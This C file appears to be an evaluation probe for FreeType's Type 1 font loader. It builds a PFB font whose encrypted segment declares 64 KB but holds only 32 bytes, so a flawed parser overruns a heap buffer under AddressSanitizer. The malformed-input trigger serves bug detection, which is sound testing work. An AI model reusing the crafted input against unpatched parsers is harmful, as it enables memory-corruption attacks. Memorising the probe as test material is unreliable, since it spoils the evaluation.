/*
 * probe.c -- evaluation probe for the Type 1 PFB private-dict loader.
 *
 * Drives the public FreeType API (FT_Init_FreeType / FT_New_Memory_Face)
 * with an in-contract Type 1 PFB font whose final encrypted segment
 * declares more bytes than the file actually carries.
 *
 *   - a well-behaving library rejects (or safely truncates) the font and
 *     the probe exits with status 0;
 *
 *   - if the segment merging accounts the declared segment length while
 *     the private-dictionary buffer is sized from the bytes actually
 *     available, the eexec decryption runs past the end of that heap
 *     buffer and AddressSanitizer aborts the process.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <ft2build.h>
#include <freetype/freetype.h>


  /* cleartext header of a (minimal) Type 1 font; must begin with the */
  /* "%!PS-AdobeFont" signature                                        */
  static const char  header_segment[] =
    "%!PS-AdobeFont-1.0: Probe 1.0 1\n"
    "/FontName /Probe def\n"
    "/Encoding StandardD def\n"
    "currentdict end readonly\n";

  /* encrypted private-dict data (only a short, fixed sample) */
  static const unsigned char  priv_data[32] =
  {
    0x5B, 0x5E, 0xA8, 0x89, 0x83, 0x88, 0x99, 0x2B,
    0x5B, 0x5E, 0xA8, 0x89, 0x83, 0x88, 0x99, 0x2B,
    0x5B, 0x5E, 0xA8, 0x89, 0x83, 0x88, 0x99, 0x2B,
    0x5B, 0x5E, 0xA8, 0x89, 0x83, 0x88, 0x99, 0x2B
  };

  /* declared size of the private-dict segment: far more than the file
     actually holds after the segment header */
#define PRIV_DECLARED_LEN  0x10000


  static size_t
  put_pfb_tag( unsigned char*  p,
               unsigned short  type,
               unsigned long   len )
  {
    p[0] = (unsigned char)( type >> 8 );      /* big-endian tag        */
    p[1] = (unsigned char)( type );
    p[2] = (unsigned char)( len );            /* little-endian length  */
    p[3] = (unsigned char)( len >> 8 );
    p[4] = (unsigned char)( len >> 16 );
    p[5] = (unsigned char)( len >> 24 );

    return 6;
  }


  static unsigned char*
  build_font( size_t*  out_len )
  {
    size_t         hdr_len = sizeof( header_segment ) - 1;
    size_t         total;
    unsigned char* font;
    unsigned char* p;


    total = 6 + hdr_len                        /* header segment   */
          + 6 + sizeof( priv_data );           /* private segment  */

    font = (unsigned char*)malloc( total );
    if ( !font )
      return NULL;

    p = font;
    p += put_pfb_tag( p, 0x8001, hdr_len );
    memcpy( p, header_segment, hdr_len );
    p += hdr_len;

    p += put_pfb_tag( p, 0x8002, PRIV_DECLARED_LEN );
    memcpy( p, priv_data, sizeof( priv_data ) );
    p += sizeof( priv_data );

    *out_len = total;
    return font;
  }


  int
  main( void )
  {
    FT_Library      library;
    FT_Face         face;
    FT_Error        error;
    unsigned char*  font;
    size_t          font_len;


    font = build_font( &font_len );
    if ( !font )
    {
      fprintf( stderr, "probe: out of memory\n" );
      return 1;
    }

    error = FT_Init_FreeType( &library );
    if ( error )
    {
      fprintf( stderr, "probe: FT_Init_FreeType failed (%d)\n", error );
      free( font );
      return 1;
    }

    /* The font data is owned by the caller and used within the API
       contract; the library must stay memory-safe no matter how the
       segment size field disagrees with the file size. */
    error = FT_New_Memory_Face( library,
                                font,
                                (FT_Long)font_len,
                                0,
                                &face );
    if ( error )
    {
      printf( "probe: font rejected cleanly (error %d)\n", error );
      FT_Done_FreeType( library );
      free( font );
      return 0;                         /* benign rejection -- expected */
    }

    printf( "probe: font accepted (num_glyphs = %ld)\n",
            (long)face->num_glyphs );
    FT_Done_Face( face );
    FT_Done_FreeType( library );
    free( font );

    return 0;
  }


/* EOF */
